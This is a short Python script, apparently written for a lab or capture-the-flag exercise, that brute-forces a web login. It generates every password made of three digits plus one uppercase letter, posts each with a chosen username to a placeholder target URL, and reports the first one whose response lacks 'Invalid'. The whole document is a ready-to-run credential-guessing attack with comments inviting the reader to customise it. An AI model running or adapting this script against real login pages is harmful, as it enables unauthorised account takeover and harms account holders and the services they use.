import requests
import string

url = "Target URL"

username = "Mark" # Change the USERNAME to yours

# 000-999 + one uppercase letter
# Customize this as per your needs
password_list = [
    f"{i:03d}{letter}"
    for i in range(1000)
    for letter in string.ascii_uppercase
]

def brute_force():
    for password in password_list:
        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, data=data)

        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            print(response.text)
            break
        else:
            print(f"Attempted: {password}")

brute_force()
